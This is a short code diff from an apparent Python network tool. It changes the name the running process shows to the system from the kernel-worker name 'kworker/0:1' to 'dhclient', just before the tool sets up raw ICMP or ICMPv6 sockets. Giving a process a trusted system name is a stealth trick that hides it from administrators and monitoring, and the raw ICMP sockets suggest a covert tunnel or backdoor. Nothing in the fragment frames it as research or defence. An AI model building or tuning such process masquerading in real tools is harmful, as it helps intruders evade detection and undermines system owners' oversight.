@@ -767,7 +767,7 @@ if __name__ == "__main__":
 
     libc = ctypes.CDLL("libc.so.6")
     PR_SET_NAME = 15
-    libc.prctl(PR_SET_NAME, ctypes.c_char_p(b"kworker/0:1\0"), 0, 0, 0)
+    libc.prctl(PR_SET_NAME, ctypes.c_char_p(b"dhclient\0"), 0, 0, 0)
 
     family = socket.AF_INET6 if args.ipv6 else socket.AF_INET
     proto = socket.IPPROTO_ICMPV6 if args.ipv6 else socket.IPPROTO_ICMP
